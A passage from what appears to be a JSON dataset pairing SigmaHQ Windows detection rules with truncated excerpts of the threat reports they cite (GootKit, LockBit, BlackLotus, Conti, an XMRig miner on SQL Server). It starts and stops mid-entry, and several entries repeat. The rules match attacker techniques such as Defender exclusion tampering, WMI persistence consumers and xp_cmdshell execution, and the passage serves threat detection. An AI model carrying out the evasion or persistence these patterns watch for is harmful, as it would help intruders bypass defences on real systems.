            "C:\\Windows\\System32\\mmc.exe",
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\System32\\wimserv.exe",
            "C:\\Windows\\System32\\RuntimeBroker.exe",
            "C:\\Windows\\System32\\SystemSettingsBroker.exe",
            "C:\\Windows\\explorer.exe"
          ]
        },
        "filter_endswith": {
          "ProcessName|endswith": [
            "\\procexp64.exe",
            "\\procexp.exe",
            "\\procmon64.exe",
            "\\procmon.exe",
            "\\Google\\Chrome\\Application\\chrome.exe",
            "\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
          ]
        },
        "filter_startswith": {
          "ProcessName|startswith": "C:\\Program Files\\WindowsApps\\Microsoft"
        },
        "condition": "selection_1 and not 1 of filter_*"
      },
      "falsepositives": [
        "Other legimate tools loading drivers. Including but not limited to, Sysinternals, CPU-Z, AVs etc. A baseline needs to be created according to the used products and allowed tools. A good thing to do is to try and exclude users who are allowed to load drivers."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_user_driver_loaded.yml"
  },
  "793": {
    "url": "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
    "markdown": "# GootKit Malware Bypasses Windows Defender by Setting Path Exclusions September 6, 2019 As Windows Defender matures and becomes tightly integrated into Windows 10, malware writers are creating techniques to evade its detection. Such is the case with the GootKit banking Trojan, which uses a UAC bypass and WMIC commands to exclude the malware executable from being scanned by Windows Defender Antivirus. GootKit is a banking Trojan that attempts to steal the online banking credentials of infected users through video capture and redirects to fake banking sites under the attacker's control. An interesting aspect of this infection is that it",
    "sigma_rule": {
      "title": "Windows Defender Exclusion List Modified",
      "id": "46a68649-f218-4f86-aea1-16a759d81820",
      "related": [
        {
          "id": "e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d",
          "type": "derived"
        },
        {
          "id": "a33f8808-2812-4373-ae95-8cfb82134978",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects modifications to the Windows Defender exclusion registry key. This could indicate a potentially suspicious or even malicious activity by an attacker trying to add a new exclusion in order to bypass security.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/"
      ],
      "author": "@BarryShooshooga",
      "date": "2019-10-26",
      "modified": "2023-11-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Security Settings/Local Policies/Audit Policy, Registry System Access Control (SACL): Auditing/User"
      },
      "detection": {
        "selection": {
          "EventID": 4657,
          "ObjectName|contains": "\\Microsoft\\Windows Defender\\Exclusions\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Intended exclusions by administrators"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_windows_defender_exclusions_registry_modified.yml"
  },
  "794": {
    "url": "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/",
    "markdown": "# GootKit Malware Bypasses Windows Defender by Setting Path Exclusions September 6, 2019 As Windows Defender matures and becomes tightly integrated into Windows 10, malware writers are creating techniques to evade its detection. Such is the case with the GootKit banking Trojan, which uses a UAC bypass and WMIC commands to exclude the malware executable from being scanned by Windows Defender Antivirus. GootKit is a banking Trojan that attempts to steal the online banking credentials of infected users through video capture and redirects to fake banking sites under the attacker's control. An interesting aspect of this infection is that it",
    "sigma_rule": {
      "title": "Windows Defender Exclusion Registry Key - Write Access Requested",
      "id": "e9c8808f-4cfb-4ba9-97d4-e5f3beaa244d",
      "related": [
        {
          "id": "46a68649-f218-4f86-aea1-16a759d81820",
          "type": "derived"
        },
        {
          "id": "a33f8808-2812-4373-ae95-8cfb82134978",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects write access requests to the Windows Defender exclusions registry keys. This could be an indication of an attacker trying to request a handle or access the object to write new exclusions in order to bypass security.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/"
      ],
      "author": "@BarryShooshooga, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-26",
      "modified": "2023-11-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Security Settings/Local Policies/Audit Policy, Registry System Access Control (SACL): Auditing/User"
      },
      "detection": {
        "selection": {
          "AccessList|contains": [
            "%%4417",
            "%%4418"
          ],
          "EventID": [
            4656,
            4663
          ],
          "ObjectName|contains": "\\Microsoft\\Windows Defender\\Exclusions\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_windows_defender_exclusions_write_access.yml"
  },
  "795": {
    "url": "https://web.archive.org/web/20170821162638/https://twitter.com/mattifestation/status/899646620148539397",
    "markdown": "# Post Aug 21, 2017 Microsoft-Windows-WMI-Activity/Operational EID 5861 FTW. Win 10 only IIRC. Logs WMI persistence like a champ. http://blog.trendmicro.com/trendlabs-security-intelligence/cryptocurrency-miner-uses-wmi-eternalblue-spread-filelessly/",
    "sigma_rule": {
      "title": "WMI Persistence - Security",
      "id": "f033f3f3-fd24-4995-97d8-a3bb17550a88",
      "related": [
        {
          "id": "0b7889b4-5577-4521-a60a-3376ee7f9f7b",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs.",
      "references": [
        "https://web.archive.org/web/20170821162638/https://twitter.com/mattifestation/status/899646620148539397",
        "https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"
      ],
      "author": "Florian Roth (Nextron Systems), Gleb Sukhodolskiy, Timur Zinniatullin oscd.community",
      "date": "2017-08-22",
      "modified": "2022-11-29",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1546.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4662,
          "ObjectType": "WMI Namespace",
          "ObjectName|contains": "subscription"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown (data set is too small; further testing needed)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_wmi_persistence.yml"
  },
  "796": {
    "url": "https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/",
    "markdown": "# Tales of a Threat Hunter 2 ## Following the trace of WMI Backdoors & other nastiness Posted on March 2, 2018 ## Table of Contents - What is WMI? - Understanding WMI Persistence - How does a WMI persistent object look like? - WMI Persistence Template by Matt G. - WMI Persistence via PowerLurk by Sw4mpf0x - WMI Persistence Detection - What about DFIR? - Detection Logics & Lessons Learned - So, to summarize - Changes to your Sysmon Config - Some references - EventCode 400 sample contents - EventCode 403 sample contents ## What is WMI? WMI is",
    "sigma_rule": {
      "title": "WMI Persistence - Security",
      "id": "f033f3f3-fd24-4995-97d8-a3bb17550a88",
      "related": [
        {
          "id": "0b7889b4-5577-4521-a60a-3376ee7f9f7b",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs.",
      "references": [
        "https://web.archive.org/web/20170821162638/https://twitter.com/mattifestation/status/899646620148539397",
        "https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"
      ],
      "author": "Florian Roth (Nextron Systems), Gleb Sukhodolskiy, Timur Zinniatullin oscd.community",
      "date": "2017-08-22",
      "modified": "2022-11-29",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1546.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4662,
          "ObjectType": "WMI Namespace",
          "ObjectName|contains": "subscription"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown (data set is too small; further testing needed)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_wmi_persistence.yml"
  },
  "797": {
    "url": "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/",
    "markdown": "# Living Off Windows Defender | LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool **July 28, 2022** --- LockBit has been receiving a fair share of attention recently. Last week, SentinelLabs reported on LockBit 3.0 (aka LockBit Black), describing how the latest iteration of this increasingly prevalent RaaS implemented a series of anti-analysis and anti-debugging routines. Our research was quickly followed up by others reporting similar findings. Meanwhile, back in April, SentinelLabs reported on how a LockBit affiliate was leveraging the legitimate VMware command line utility, `VMwareXferlogs.exe`, in a live engagement to side load Cobalt Strike. In this post,",
    "sigma_rule": {
      "title": "Microsoft Defender Blocked from Loading Unsigned DLL",
      "id": "0b0ea3cc-99c8-4730-9c53-45deee2a4c86",
      "status": "test",
      "description": "Detects Code Integrity (CI) engine blocking Microsoft Defender's processes (MpCmdRun and NisSrv) from loading unsigned DLLs which may be an attempt to sideload arbitrary DLL",
      "references": [
        "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/"
      ],
      "author": "Bhabesh Raj",
      "date": "2022-08-02",
      "modified": "2022-09-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security-mitigations"
      },
      "detection": {
        "selection": {
          "EventID": [
            11,
            12
          ],
          "ProcessPath|endswith": [
            "\\MpCmdRun.exe",
            "\\NisSrv.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security_mitigations\\win_security_mitigations_defender_load_unsigned_dll.yml"
  },
  "798": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Windows Defender Real-Time Protection Failure/Restart",
      "id": "dd80db93-6ec2-4f4c-a017-ad40da6ffe81",
      "status": "stable",
      "description": "Detects issues with Windows Defender Real-Time Protection features",
      "references": [
        "Internal Research",
        "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/",
        "https://gist.github.com/nasbench/33732d6705cbdc712fae356f07666346"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Christopher Peacock '@securepeacock' (Update)",
      "date": "2023-03-28",
      "modified": "2023-05-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "windefend"
      },
      "detection": {
        "selection": {
          "EventID": [
            3002,
            3007
          ]
        },
        "filter_optional_network_inspection": {
          "Feature_Name": "%%886",
          "Reason": [
            "%%892",
            "%%858"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Some crashes can occur sometimes and the event doesn't provide enough information to tune out these cases. Manual exception is required"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\windefend\\win_defender_real_time_protection_errors.yml"
  },
  "799": {
    "url": "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/",
    "markdown": "# Guidance for investigating attacks using CVE-2022-21894: The BlackLotus campaign **April 11, 2023** --- This guide provides steps that organizations can take to assess whether users have been targeted or compromised by threat actors exploiting CVE-2022-21894 via a Unified Extensible Firmware Interface (UEFI) bootkit called BlackLotus. UEFI bootkits are particularly dangerous as they run at computer startup, prior to the operating system loading, and therefore can interfere with or deactivate various operating system (OS) security mechanisms such as BitLocker, hypervisor-protected code integrity (HVCI), and Microsoft Defender Antivirus. Though this could impede investigations and threat hunting efforts, several artifacts can still",
    "sigma_rule": {
      "title": "Windows Defender Real-Time Protection Failure/Restart",
      "id": "dd80db93-6ec2-4f4c-a017-ad40da6ffe81",
      "status": "stable",
      "description": "Detects issues with Windows Defender Real-Time Protection features",
      "references": [
        "Internal Research",
        "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/",
        "https://gist.github.com/nasbench/33732d6705cbdc712fae356f07666346"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Christopher Peacock '@securepeacock' (Update)",
      "date": "2023-03-28",
      "modified": "2023-05-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "windefend"
      },
      "detection": {
        "selection": {
          "EventID": [
            3002,
            3007
          ]
        },
        "filter_optional_network_inspection": {
          "Feature_Name": "%%886",
          "Reason": [
            "%%892",
            "%%858"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Some crashes can occur sometimes and the event doesn't provide enough information to tune out these cases. Manual exception is required"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\windefend\\win_defender_real_time_protection_errors.yml"
  },
  "800": {
    "url": "https://gist.github.com/nasbench/33732d6705cbdc712fae356f07666346",
    "markdown": "",
    "sigma_rule": {
      "title": "Windows Defender Real-Time Protection Failure/Restart",
      "id": "dd80db93-6ec2-4f4c-a017-ad40da6ffe81",
      "status": "stable",
      "description": "Detects issues with Windows Defender Real-Time Protection features",
      "references": [
        "Internal Research",
        "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/",
        "https://gist.github.com/nasbench/33732d6705cbdc712fae356f07666346"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Christopher Peacock '@securepeacock' (Update)",
      "date": "2023-03-28",
      "modified": "2023-05-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "windefend"
      },
      "detection": {
        "selection": {
          "EventID": [
            3002,
            3007
          ]
        },
        "filter_optional_network_inspection": {
          "Feature_Name": "%%886",
          "Reason": [
            "%%892",
            "%%858"
          ]
        },
        "condition": "selection and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Some crashes can occur sometimes and the event doesn't provide enough information to tune out these cases. Manual exception is required"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\windefend\\win_defender_real_time_protection_errors.yml"
  },
  "801": {
    "url": "https://web.archive.org/web/20170821162638/https://twitter.com/mattifestation/status/899646620148539397",
    "markdown": "# Post Aug 21, 2017 Microsoft-Windows-WMI-Activity/Operational EID 5861 FTW. Win 10 only IIRC. Logs WMI persistence like a champ. http://blog.trendmicro.com/trendlabs-security-intelligence/cryptocurrency-miner-uses-wmi-eternalblue-spread-filelessly/",
    "sigma_rule": {
      "title": "WMI Persistence",
      "id": "0b7889b4-5577-4521-a60a-3376ee7f9f7b",
      "status": "test",
      "description": "Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs.",
      "references": [
        "https://web.archive.org/web/20170821162638/https://twitter.com/mattifestation/status/899646620148539397",
        "https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"
      ],
      "author": "Florian Roth (Nextron Systems), Gleb Sukhodolskiy, Timur Zinniatullin oscd.community",
      "date": "2017-08-22",
      "modified": "2022-02-10",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1546.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "wmi",
        "definition": "WMI Namespaces Auditing and SACL should be configured, EventID 5861 and 5859 detection requires Windows 10, 2012 and higher"
      },
      "detection": {
        "wmi_filter_to_consumer_binding": {
          "EventID": 5861
        },
        "consumer_keywords": [
          "ActiveScriptEventConsumer",
          "CommandLineEventConsumer",
          "CommandLineTemplate"
        ],
        "wmi_filter_registration": {
          "EventID": 5859
        },
        "filter_scmevent": {
          "Provider": "SCM Event Provider",
          "Query": "select * from MSFT_SCMEventLogEvent",
          "User": "S-1-5-32-544",
          "PossibleCause": "Permanent"
        },
        "condition": "( (wmi_filter_to_consumer_binding and consumer_keywords) or (wmi_filter_registration) ) and not filter_scmevent"
      },
      "falsepositives": [
        "Unknown (data set is too small; further testing needed)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\wmi\\win_wmi_persistence.yml"
  },
  "802": {
    "url": "https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/",
    "markdown": "# Tales of a Threat Hunter 2 ## Following the trace of WMI Backdoors & other nastiness Posted on March 2, 2018 ## Table of Contents - What is WMI? - Understanding WMI Persistence - How does a WMI persistent object look like? - WMI Persistence Template by Matt G. - WMI Persistence via PowerLurk by Sw4mpf0x - WMI Persistence Detection - What about DFIR? - Detection Logics & Lessons Learned - So, to summarize - Changes to your Sysmon Config - Some references - EventCode 400 sample contents - EventCode 403 sample contents ## What is WMI? WMI is",
    "sigma_rule": {
      "title": "WMI Persistence",
      "id": "0b7889b4-5577-4521-a60a-3376ee7f9f7b",
      "status": "test",
      "description": "Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs.",
      "references": [
        "https://web.archive.org/web/20170821162638/https://twitter.com/mattifestation/status/899646620148539397",
        "https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/"
      ],
      "author": "Florian Roth (Nextron Systems), Gleb Sukhodolskiy, Timur Zinniatullin oscd.community",
      "date": "2017-08-22",
      "modified": "2022-02-10",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1546.003"
      ],
      "logsource": {
        "product": "windows",
        "service": "wmi",
        "definition": "WMI Namespaces Auditing and SACL should be configured, EventID 5861 and 5859 detection requires Windows 10, 2012 and higher"
      },
      "detection": {
        "wmi_filter_to_consumer_binding": {
          "EventID": 5861
        },
        "consumer_keywords": [
          "ActiveScriptEventConsumer",
          "CommandLineEventConsumer",
          "CommandLineTemplate"
        ],
        "wmi_filter_registration": {
          "EventID": 5859
        },
        "filter_scmevent": {
          "Provider": "SCM Event Provider",
          "Query": "select * from MSFT_SCMEventLogEvent",
          "User": "S-1-5-32-544",
          "PossibleCause": "Permanent"
        },
        "condition": "( (wmi_filter_to_consumer_binding and consumer_keywords) or (wmi_filter_registration) ) and not filter_scmevent"
      },
      "falsepositives": [
        "Unknown (data set is too small; further testing needed)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\wmi\\win_wmi_persistence.yml"
  },
  "803": {
    "url": "https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html",
    "markdown": "# Ransomware Actor Abuses Genshin Impact Anti-Cheat Driver to Kill Antivirus We investigate `mhyprot2.sys`, a vulnerable anti-cheat driver for the popular role-playing game Genshin Impact. The driver is currently being abused by a ransomware actor to kill antivirus processes and services for mass-deploying ransomware. **Date:** August 24, 2022 --- There have already been reports on code-signed rootkits like Netfilter, FiveSys, and Fire Chili. These rootkits are usually signed with stolen certificates or are falsely validated. However, when a legitimate driver is used as a rootkit, that’s a different story. Such is the case of *mhyprot2.sys*, a vulnerable anti-cheat driver for",
    "sigma_rule": {
      "title": "MSI Installation From Suspicious Locations",
      "id": "c7c8aa1c-5aff-408e-828b-998e3620b341",
      "status": "test",
      "description": "Detects MSI package installation from suspicious locations",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-31",
      "modified": "2023-10-23",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "application"
      },
      "detection": {
        "selection": {
          "Provider_Name": "MsiInstaller",
          "EventID": [
            1040,
            1042
          ],
          "Data|contains": [
            ":\\Windows\\TEMP\\",
            "\\\\\\\\",
            "\\Desktop\\",
            "\\PerfLogs\\",
            "\\Users\\Public\\"
          ]
        },
        "filter_winget": {
          "Data|contains": "\\AppData\\Local\\Temp\\WinGet\\"
        },
        "filter_updhealthtools": {
          "Data|contains": "C:\\Windows\\TEMP\\UpdHealthTools.msi"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "False positives may occur if you allow installation from folders such as the desktop, the public folder or remote shares. A baseline is required before production use."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\msiinstaller\\win_msi_install_from_susp_locations.yml"
  },
  "804": {
    "url": "https://web.archive.org/web/20230208191147/https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent",
    "markdown": "# Secret \"Backdoor\" Behind Conti Ransomware Operation: Introducing Atera Agent *Updated: Oct 7, 2021* *Published: Aug 11, 2021* --- This report is based on our actual proactive victim breach intelligence and subsequent incident response (not a simulated or sandbox environment) identified via unique high-value collections at AdvIntel. ```image Alt: Conti Ransomware Operation Description: The image features a combination of a portrait photograph of an individual alongside textual content discussing the Atera Agent's role in the Conti ransomware operation. The text highlights how the Atera Agent enabled the Conti gang to maintain persistent access to compromised environments that had robust machine",
    "sigma_rule": {
      "title": "Atera Agent Installation",
      "id": "87261fb2-69d0-42fe-b9de-88c6b5f65a43",
      "status": "test",
      "description": "Detects successful installation of Atera Remote Monitoring & Management (RMM) agent as recently found to be used by Conti operators",
      "references": [
        "https://web.archive.org/web/20230208191147/https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent"
      ],
      "author": "Bhabesh Raj",
      "date": "2021-09-01",
      "modified": "2022-12-25",
      "tags": [
        "attack.t1219"
      ],
      "logsource": {
        "service": "application",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventID": 1033,
          "Provider_Name": "MsiInstaller",
          "Message|contains": "AteraAgent"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate Atera agent installation"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\msiinstaller\\win_software_atera_rmm_agent_install.yml"
  },
  "805": {
    "url": "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
    "markdown": "# Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures **Network Pentesting | March 7, 2016** --- During red team and penetration test engagements, one common goal is to maintain access to target environments while security teams attempt to identify and remove persistence methods. There are many ways to maintain persistent access to Windows environments. However, detective controls tend to focus on compromised account identification and persistence methods at the operating system layer. While prioritizing detective control development in those areas is a good practice, common database persistence methods are often overlooked. In this blog series, I’m planning",
    "sigma_rule": {
      "title": "MSSQL XPCmdshell Suspicious Execution",
      "id": "7f103213-a04e-4d59-8261-213dddf22314",
      "status": "test",
      "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure is used to execute commands",
      "references": [
        "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-06-26",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "application",
        "definition": "Requirements: MSSQL audit policy to monitor for \"xp_cmdshell\" must be enabled in order to receive this event in the application log (Follow this tutorial https://dba.stackexchange.com/questions/103183/is-there-any-way-to-monitor-execution-of-xp-cmdshell-in-sql-server-2012)"
      },
      "detection": {
        "selection": {
          "Provider_Name|contains": "MSSQL",
          "EventID": 33205,
          "Data|contains|all": [
            "object_name:xp_cmdshell",
            "statement:EXEC"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\mssqlserver\\win_mssql_xp_cmdshell_audit_log.yml"
  },
  "806": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "MSSQL XPCmdshell Suspicious Execution",
      "id": "7f103213-a04e-4d59-8261-213dddf22314",
      "status": "test",
      "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure is used to execute commands",
      "references": [
        "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-06-26",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "application",
        "definition": "Requirements: MSSQL audit policy to monitor for \"xp_cmdshell\" must be enabled in order to receive this event in the application log (Follow this tutorial https://dba.stackexchange.com/questions/103183/is-there-any-way-to-monitor-execution-of-xp-cmdshell-in-sql-server-2012)"
      },
      "detection": {
        "selection": {
          "Provider_Name|contains": "MSSQL",
          "EventID": 33205,
          "Data|contains|all": [
            "object_name:xp_cmdshell",
            "statement:EXEC"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\mssqlserver\\win_mssql_xp_cmdshell_audit_log.yml"
  },
  "807": {
    "url": "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
    "markdown": "# Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures **Network Pentesting | March 7, 2016** --- During red team and penetration test engagements, one common goal is to maintain access to target environments while security teams attempt to identify and remove persistence methods. There are many ways to maintain persistent access to Windows environments. However, detective controls tend to focus on compromised account identification and persistence methods at the operating system layer. While prioritizing detective control development in those areas is a good practice, common database persistence methods are often overlooked. In this blog series, I’m planning",
    "sigma_rule": {
      "title": "MSSQL XPCmdshell Option Change",
      "id": "d08dd86f-681e-4a00-a92c-1db218754417",
      "status": "test",
      "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure setting is changed.\n",
      "references": [
        "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-06-26",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "application"
      },
      "detection": {
        "selection": {
          "Provider_Name|contains": "MSSQL",
          "EventID": 15457,
          "Data|contains": "xp_cmdshell"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate enable/disable of the setting",
        "Note that since the event contain the change for both values. This means that this will trigger on both enable and disable"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\mssqlserver\\win_mssql_xp_cmdshell_change.yml"
  },
  "808": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "MSSQL XPCmdshell Option Change",
      "id": "d08dd86f-681e-4a00-a92c-1db218754417",
      "status": "test",
      "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure setting is changed.\n",
      "references": [
        "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-06-26",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "application"
      },
      "detection": {
        "selection": {
          "Provider_Name|contains": "MSSQL",
          "EventID": 15457,
          "Data|contains": "xp_cmdshell"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate enable/disable of the setting",
        "Note that since the event contain the change for both values. This means that this will trigger on both enable and disable"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\application\\mssqlserver\\win_mssql_xp_cmdshell_change.yml"
  },
  "809": {
    "url": "https://web.archive.org/web/20220419045003/https://cyberwardog.blogspot.com/2017/04/chronicles-of-threat-hunter-hunting-for.html",
